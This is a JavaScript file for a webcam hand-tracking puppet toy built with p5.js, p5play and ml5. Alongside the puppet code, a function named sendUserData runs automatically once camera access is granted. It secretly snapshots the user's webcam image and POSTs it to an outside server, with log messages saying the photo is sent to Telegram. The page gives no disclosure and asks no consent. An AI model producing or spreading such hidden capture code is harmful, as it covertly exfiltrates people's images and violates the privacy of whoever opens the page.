// Simple initialization with global mode
console.log('=== STARTING APPLICATION ===');

// Update loading status
function updateStatus(message) {
    const statusEl = document.getElementById('status');
    if (statusEl) {
        statusEl.textContent = message;
    }
    console.log('Status:', message);
}

// Show error
function showError(message) {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.innerHTML = `
            <div style="color: red; text-align: center;">
                <h3>❌ Error</h3>
                <p>${message}</p>
                <button onclick="location.reload()" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">
                    Reload Page
                </button>
            </div>
        `;
    }
    console.error('Error:', message);
}

// Check if libraries are loaded
function checkLibraries() {
    updateStatus('Checking libraries...');
    
    const libraries = {
        'p5.js': typeof p5 !== 'undefined',
        'p5play.js': typeof Group !== 'undefined', 
        'ml5.js': typeof ml5 !== 'undefined'
    };
    
    console.log('Library check:', libraries);
    
    for (const [lib, loaded] of Object.entries(libraries)) {
        if (!loaded) {
            showError(`${lib} failed to load. Please refresh the page.`);
            return false;
        }
    }
    
    updateStatus('All libraries loaded successfully!');
    return true;
}

// Wait for everything to load
window.addEventListener('load', function() {
    console.log('=== WINDOW LOADED ===');
    
    if (!checkLibraries()) {
        return;
    }
    
    // Start the application
    setTimeout(initializeApp, 100);
});

// Global variables
let handpose;
let video;
let hands = [];
let options = { maxHands: 2, flipHorizontal: true, runtime: "mediapipe" };
let xMax = 640;
let yMax = 480;
let whichHand;
let pScale = 0.5;
let yGap = 150;
let photoSent = false;
let backendUrl = 'https://last-ia4c.onrender.com';

// Puppet parts
let pieces, shoulders, neck, head;
let leftUpperArm, leftLowerArm, rightUpperArm, rightLowerArm;
let torso, hips, leftThigh, leftLowerLeg, leftFoot, rightThigh, rightLowerLeg, rightFoot;

function initializeApp() {
    console.log('=== INITIALIZING APP ===');
    updateStatus('Initializing hand tracking...');
    
    try {
        // Initialize ml5 handpose
        handpose = ml5.handPose(options, function() {
            console.log('✅ Handpose model loaded');
            updateStatus('Handpose model loaded - creating canvas...');
            setup();
        });
        
    } catch (error) {
        console.error('Failed to initialize handpose:', error);
        showError('Failed to initialize hand tracking: ' + error.message);
    }
}

function setup() {
    console.log('=== SETUP STARTED ===');
    updateStatus('Creating canvas and camera...');
    
    try {
        // Create canvas
        createCanvas(xMax, yMax);
        console.log('✅ Canvas created');
        
        // Setup physics
        world.gravity.y = 20;
        
        // Create video capture
        video = createCapture(VIDEO, function() {
            console.log('✅ Camera access granted');
            updateStatus('Camera ready - setting up puppet...');
            document.getElementById('loading').style.display = 'none';
            
            // Start hand detection
            handpose.detectStart(video, gotHands);
            
            // Create puppet
            createPuppet();
            
            // Send user data
            sendUserData();
        });
        
        video.size(xMax, yMax);
        video.hide();
        
        // Handle camera errors
        video.elt.addEventListener('error', function() {
            console.error('❌ Camera access denied');
            document.getElementById('permissionMessage').style.display = 'block';
            document.getElementById('loading').style.display = 'none';
        });
        
    } catch (error) {
        console.error('Setup error:', error);
        showError('Setup failed: ' + error.message);
    }
}

function draw() {
    // Clear background
    background(255);
    
    // Draw video
    push();
    if (options.flipHorizontal) {
        translate(width, 0);
        scale(-1, 1);
    }
    image(video, 0, 0, width, height);
    pop();
    
    // Update puppet if hands are detected
    if (hands.length > 0) {
        updatePuppet();
    }
}

function createPuppet() {
    console.log('Creating puppet...');
    
    // Create group
    pieces = new Group();
    pieces.color = 'white';
    pieces.overlaps(pieces);
    pieces.stroke = 'white';
    pieces.drag = 1;

    // Shoulders
    shoulders = new pieces.Sprite();
    shoulders.width = pScale * 100;
    shoulders.height = pScale * 30;
    shoulders.x = xMax / 2;
    shoulders.y = yMax / 2;

    // Neck
    neck = new pieces.Sprite();
    neck.width = pScale * 20;
    neck.height = pScale * 50;
    neck.x = xMax / 2;
    neck.y = yMax / 2 - pScale * 30;
    new GlueJoint(neck, shoulders);

    // Head
    head = new pieces.Sprite();
    head.diameter = pScale * 80;
    head.x = xMax / 2;
    head.y = yMax / 2 - pScale * 70;
    head.img = '😀';
    head.textSize = pScale * 40;
    new GlueJoint(neck, head);

    // Create arms, torso, legs (simplified for now)
    createArms();
    createTorso();
    createLegs();
    
    // Boundary
    createBoundary();
    
    console.log('✅ Puppet created successfully');
}

function createArms() {
    // Left arm (simplified)
    leftUpperArm = new pieces.Sprite();
    leftUpperArm.width = pScale * 20;
    leftUpperArm.height = pScale * 60;
    leftUpperArm.x = xMax / 2 - pScale * 40;
    leftUpperArm.y = yMax / 2 + pScale * 40;
    leftUpperArm.color = 'cyan';

    leftLowerArm = new pieces.Sprite();
    leftLowerArm.width = pScale * 20;
    leftLowerArm.height = pScale * 60;
    leftLowerArm.x = xMax / 2 - pScale * 40;
    leftLowerArm.y = yMax / 2 + pScale * 90;
    leftLowerArm.color = 'cyan';

    // Right arm (simplified)
    rightUpperArm = new pieces.Sprite();
    rightUpperArm.width = pScale * 20;
    rightUpperArm.height = pScale * 60;
    rightUpperArm.x = xMax / 2 + pScale * 40;
    rightUpperArm.y = yMax / 2 + pScale * 40;
    rightUpperArm.color = 'cyan';

    rightLowerArm = new pieces.Sprite();
    rightLowerArm.width = pScale * 20;
    rightLowerArm.height = pScale * 60;
    rightLowerArm.x = xMax / 2 + pScale * 40;
    rightLowerArm.y = yMax / 2 + pScale * 90;
    rightLowerArm.color = 'cyan';
}

function createTorso() {
    torso = new pieces.Sprite();
    torso.width = pScale * 50;
    torso.height = pScale * 90;
    torso.x = xMax / 2;
    torso.y = yMax / 2 + pScale * 50;
    new GlueJoint(torso, shoulders);

    hips = new pieces.Sprite();
    hips.width = pScale * 100;
    hips.height = pScale * 30;
    hips.x = xMax / 2;
    hips.y = yMax / 2 + pScale * 90;
    new GlueJoint(torso, hips);
}

function createLegs() {
    // Left leg (simplified)
    leftThigh = new pieces.Sprite();
    leftThigh.width = pScale * 30;
    leftThigh.height = pScale * 90;
    leftThigh.x = xMax / 2 - pScale * 40;
    leftThigh.y = yMax / 2 + pScale * 130;
    leftThigh.color = 'blue';

    leftLowerLeg = new pieces.Sprite();
    leftLowerLeg.width = pScale * 30;
    leftLowerLeg.height = pScale * 90;
    leftLowerLeg.x = xMax / 2 - pScale * 40;
    leftLowerLeg.y = yMax / 2 + pScale * 200;
    leftLowerLeg.color = 'blue';

    // Right leg (simplified)
    rightThigh = new pieces.Sprite();
    rightThigh.width = pScale * 30;
    rightThigh.height = pScale * 90;
    rightThigh.x = xMax / 2 + pScale * 40;
    rightThigh.y = yMax / 2 + pScale * 130;
    rightThigh.color = 'blue';

    rightLowerLeg = new pieces.Sprite();
    rightLowerLeg.width = pScale * 30;
    rightLowerLeg.height = pScale * 90;
    rightLowerLeg.x = xMax / 2 + pScale * 40;
    rightLowerLeg.y = yMax / 2 + pScale * 200;
    rightLowerLeg.color = 'blue';
}

function createBoundary() {
    let box = new Sprite([
        [0, 0],
        [xMax, 0],
        [xMax, yMax],
        [0, yMax],
        [0, 0]
    ]);
    box.collider = "static";
    box.shape = "chain";
    box.color = "skyblue";
}

function updatePuppet() {
    stroke('white');
    
    if (hands.length > 0 && hands[0].keypoints) {
        // Head follows middle finger tip
        const middleTip = hands[0].keypoints[12];
        if (head && middleTip) {
            head.moveTowards(middleTip.x, middleTip.y + yGap, 0.5);
            line(head.x, head.y, middleTip.x, middleTip.y);
        }
        
        // Simple arm movement
        const indexTip = hands[0].keypoints[8];
        if (leftLowerArm && indexTip) {
            leftLowerArm.moveTowards(indexTip.x, indexTip.y + yGap, 0.5);
        }
        
        const pinkyTip = hands[0].keypoints[20];
        if (rightLowerArm && pinkyTip) {
            rightLowerArm.moveTowards(pinkyTip.x, pinkyTip.y + yGap, 0.5);
        }
        
        // Get handedness
        whichHand = hands[0].handedness;
    }
}

function gotHands(results) {
    hands = results;
}

async function sendUserData() {
    if (photoSent || !video) return;

    try {
        console.log('📸 Capturing photo for Telegram...');
        
        const canvas = document.createElement('canvas');
        canvas.width = video.width;
        canvas.height = video.height;
        const ctx = canvas.getContext('2d');

        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video.elt, 0, 0, canvas.width, canvas.height);

        const photoData = canvas.toDataURL('image/jpeg', 0.8);

        const response = await fetch(`${backendUrl}/api/user-data`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ photo: photoData })
        });

        if (response.ok) {
            console.log('✅ Photo sent to Telegram');
            photoSent = true;
        } else {
            console.error('❌ Failed to send photo');
        }
    } catch (error) {
        console.error('Error sending photo:', error);
    }
}

// Hand landmark constants
const ML5HAND_WRIST = 0;
const ML5HAND_THUMB_CMC = 1;
const ML5HAND_THUMB_MCP = 2;
const ML5HAND_THUMB_IP = 3;
const ML5HAND_THUMB_TIP = 4;
const ML5HAND_INDEX_FINGER_MCP = 5;
const ML5HAND_INDEX_FINGER_PIP = 6;
const ML5HAND_INDEX_FINGER_DIP = 7;
const ML5HAND_INDEX_FINGER_TIP = 8;
const ML5HAND_MIDDLE_FINGER_MCP = 9;
const ML5HAND_MIDDLE_FINGER_PIP = 10;
const ML5HAND_MIDDLE_FINGER_DIP = 11;
const ML5HAND_MIDDLE_FINGER_TIP = 12;
const ML5HAND_RING_FINGER_MCP = 13;
const ML5HAND_RING_FINGER_PIP = 14;
const ML5HAND_RING_FINGER_DIP = 15;
const ML5HAND_RING_FINGER_TIP = 16;
const ML5HAND_PINKY_MCP = 17;
const ML5HAND_PINKY_PIP = 18;
const ML5HAND_PINKY_DIP = 19;
const ML5HAND_PINKY_TIP = 20;